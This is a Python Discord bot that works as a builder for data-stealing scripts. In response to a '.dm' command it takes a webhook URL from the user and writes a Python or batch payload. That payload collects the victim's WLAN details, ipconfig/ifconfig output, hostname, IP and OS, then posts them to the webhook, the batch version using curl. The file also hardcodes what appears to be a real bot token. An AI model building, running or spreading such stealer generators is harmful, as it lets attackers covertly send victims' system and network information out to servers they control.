import discord
import subprocess
import socket
import platform
import os
import requests


BOT_TOKEN = 'MTI4NzExMTAyNDM4NTcyMDM3MA.GbyKWr.p07TzwnnxV3QDdtC_IXhkUGL_KyBoacOR_Kazc'  
PYTHON_CHANNEL_ID = 1287107164766212128 
BATCH_CHANNEL_ID = 1287107197389639806  

client = discord.Client(intents=discord.Intents.all())


def collect_info():
    info = {}

    try:
        if platform.system() == "Windows":
            wlan_info = subprocess.check_output(["netsh", "wlan", "show", "interfaces"], text=True)
        else:
            wlan_info = subprocess.check_output(["iwconfig"], text=True)
        info['WLAN Information'] = wlan_info
    except subprocess.CalledProcessError as e:
        info['WLAN Information'] = f"Error collecting WLAN info: {e}"

    try:
        if platform.system() == "Windows":
            ip_info = subprocess.check_output(["ipconfig", "/all"], text=True)
        else:
            ip_info = subprocess.check_output(["ifconfig"], text=True)
        info['IP Information'] = ip_info
    except subprocess.CalledProcessError as e:
        info['IP Information'] = f"Error collecting IP info: {e}"

    info['Hostname'] = socket.gethostname()
    info['IP Address'] = socket.gethostbyname(socket.gethostname())
    info['Platform'] = platform.system() + " " + platform.version()

    return info


def create_python_script(filename, webhook_url):
    content = f"""
import requests
import subprocess
import socket
import platform

def collect_info():
    info = {{}}

    try:
        if platform.system() == "Windows":
            wlan_info = subprocess.check_output(["netsh", "wlan", "show", "interfaces"], text=True)
        else:
            wlan_info = subprocess.check_output(["iwconfig"], text=True)
        info['WLAN Information'] = wlan_info
    except subprocess.CalledProcessError as e:
        info['WLAN Information'] = f"Error collecting WLAN info: {{e}}"

    try:
        if platform.system() == "Windows":
            ip_info = subprocess.check_output(["ipconfig", "/all"], text=True)
        else:
            ip_info = subprocess.check_output(["ifconfig"], text=True)
        info['IP Information'] = ip_info
    except subprocess.CalledProcessError as e:
        info['IP Information'] = f"Error collecting IP info: {{e}}"

    info['Hostname'] = socket.gethostname()
    info['IP Address'] = socket.gethostbyname(socket.gethostname())
    info['Platform'] = platform.system() + " " + platform.version()

    return info

def send_data_to_webhook(webhook_url):
    info = collect_info()
    data = "\\n".join([f"\\n=== {{section}} ===\\n{{content}}" for section, content in info.items()])
    response = requests.post(webhook_url, json={{"content": data}})
    return response

def main():
    webhook_url = "{webhook_url}"
    response = send_data_to_webhook(webhook_url)
    print("Data sent to webhook, response status:", response.status_code)

if __name__ == "__main__":
    main()
"""
    with open(f"{filename}.py", "w", encoding='utf-8') as file:
        file.write(content)


def create_batch_script(filename, webhook_url):
    content = f"""
@echo off
setlocal
set webhook_url={webhook_url}

:collect_info
for /f "tokens=*" %%i in ('ipconfig') do echo %%i >> log.txt
for /f "tokens=*" %%i in ('hostname') do echo %%i >> log.txt

:send_to_webhook
curl -X POST -H "Content-Type: application/json" -d @log.txt %webhook_url%
echo Sent to webhook
"""
    with open(f"{filename}.bat", "w") as file:
        file.write(content)


async def handle_file_creation(message, file_type, webhook_url):
    await message.author.send("Enter the file name /without .py-.bat:")

    def check(m):
        return m.author == message.author and isinstance(m.channel, discord.DMChannel)

    try:
        response = await client.wait_for('message', check=check, timeout=60.0)
        filename = response.content
    except:
        await message.author.send("Timeout. Please try again.")
        return

    if file_type == "python":
        create_python_script(filename, webhook_url)
        file_path = f"{filename}.py"
    elif file_type == "batch":
        create_batch_script(filename, webhook_url)
        file_path = f"{filename}.bat"

    await message.author.send(f"{file_type.capitalize()} file '{file_path}' created and sent to the webhook 🟢.")
    with open(file_path, "rb") as f:
        requests.post(webhook_url, files={"file": f})


@client.event
async def on_ready():
    pass

@client.event
async def on_message(message):
    if message.author == client.user:
        return


    if message.channel.id == PYTHON_CHANNEL_ID and message.content.startswith(".dm"):
        await message.author.send("Enter the Discord Webhook URL:")

        def check(m):
            return m.author == message.author and isinstance(m.channel, discord.DMChannel)

        try:
            response = await client.wait_for('message', check=check, timeout=60.0)
            webhook_url = response.content
        except:
            await message.author.send("Timeout. Please try again.")
            return

        await message.author.send("Choose the file type:\n1. Python (.py)\n2. Batch (.bat)")
        try:
            response = await client.wait_for('message', check=check, timeout=60.0)
            choice = response.content
        except:
            await message.author.send("Timeout. Please try again.")
            return

        if choice == "1":
            await handle_file_creation(message, "python", webhook_url)
        elif choice == "2":
            await handle_file_creation(message, "batch", webhook_url)
        else:
            await message.author.send("Invalid choice. Please enter 1 or 2.")


    elif message.channel.id == BATCH_CHANNEL_ID and message.content.startswith(".dm"):
        await message.author.send("Enter the Discord Webhook URL:")

        def check(m):
            return m.author == message.author and isinstance(m.channel, discord.DMChannel)

        try:
            response = await client.wait_for('message', check=check, timeout=60.0)
            webhook_url = response.content
        except:
            await message.author.send("Timeout. Please try again.")
            return

        await message.author.send("Choose the file type:\n1. Python (.py)\n2. Batch (.bat)")
        try:
            response = await client.wait_for('message', check=check, timeout=60.0)
            choice = response.content
        except:
            await message.author.send("Timeout. Please try again.")
            return

        if choice == "1":
            await handle_file_creation(message, "python", webhook_url)
        elif choice == "2":
            await handle_file_creation(message, "batch", webhook_url)
        else:
            await message.author.send("Invalid choice. Please enter 1 or 2.")

client.run(BOT_TOKEN)
